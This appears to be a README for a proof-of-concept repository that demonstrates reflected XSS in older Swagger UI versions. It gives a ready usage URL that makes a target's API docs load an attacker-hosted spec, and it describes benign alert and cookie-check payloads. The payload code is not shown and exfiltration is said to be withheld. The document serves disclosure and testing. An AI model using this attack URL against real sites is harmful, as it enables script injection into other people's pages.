# Swagger UI XSS PoC

Security research / authorised penetration testing use only.

## What this demonstrates
Reflected XSS via the `configUrl`/`url` parameter in Swagger UI (≤4.1.3 approx).
External OpenAPI specs are loaded and descriptions rendered as raw HTML.

## Usage
https://[target]/api-docs/?configUrl=https://raw.githubusercontent.com/[you]/swagger-ui-xss-poc/main/poc.json


## PoC payload behaviour
- `poc.json` — alerts `document.domain`, changes page title. No data leaves the browser.
- `poc-cookie-check.json` — alerts whether cookies are HttpOnly protected. No exfiltration.

## Not included
No actual cookie/session exfiltration. Escalation payloads are not published here.
